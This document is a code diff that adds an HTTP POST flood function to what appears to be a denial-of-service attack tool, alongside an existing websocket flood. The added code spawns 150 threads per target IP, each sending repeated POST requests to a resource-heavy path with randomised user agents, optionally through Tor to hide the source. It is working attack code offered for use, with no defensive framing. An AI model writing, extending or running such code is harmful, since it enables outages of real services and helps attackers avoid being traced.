@@ -861,3 +861,70 @@ def attack_websocket_flood(target_domain, path, port, duration, stop_event, paus
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
     stop_event.set()
+
+
+# --- NEW: "Heavy Request" HTTP POST Flood ---
+def http_heavy_post_worker(stop_event, pause_event, target_ip, port, host_header, path, post_data, use_proxy):
+    """
+    Worker that sends POST requests to a *specific, resource-intensive* path.
+    """
+    s = None
+    while not stop_event.is_set():
+        if pause_event.is_set():
+            time.sleep(1)
+            continue
+        try:
+            if use_proxy:
+                s = socks.socksocket()
+                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            else:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            s.settimeout(20 if use_proxy else 4)
+            s.connect((target_ip, port))
+
+            # Use the user-provided data, or generate random data if none is given
+            data_to_send = post_data if post_data else "".join(random.sample(string.ascii_letters + string.digits, 100))
+            user_agent = random.choice(USER_AGENTS)
+
+            # Craft the POST request with the specific path and data
+            request = (
+                f"POST {path} HTTP/1.1\n"
+                f"Host: {host_header}\n"
+                f"User-Agent: {user_agent}\n"
+                f"Content-Type: application/x-www-form-urlencoded\n"
+                f"Content-Length: {len(data_to_send)}\n"
+                f"Connection: close\n\n"
+                f"{data_to_send}"
+            ).encode()
+
+            s.send(request)
+        except Exception:
+            time.sleep(0.5)
+        finally:
+            if s:
+                s.close()
+
+
+def attack_heavy_http_post(target_url, path, port, post_data, duration, stop_event, pause_event, threads=150,
+                           use_proxy=False):
+    """Controller for Heavy HTTP POST flood attacks."""
+    ips = get_target_ips(target_url)  # Using our smart IP/domain resolver
+    if not ips:
+        print(f"[ERROR] Could not resolve target {target_url}. Aborting heavy POST attack.")
+        return
+
+    print(f"[INFO] Launching Heavy POST flood on {target_url}:{port}{path}")
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(threads):
+            t = threading.Thread(
+                target=http_heavy_post_worker,
+                args=(stop_event, pause_event, ip, port, target_url, path, post_data, use_proxy)
+            )
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
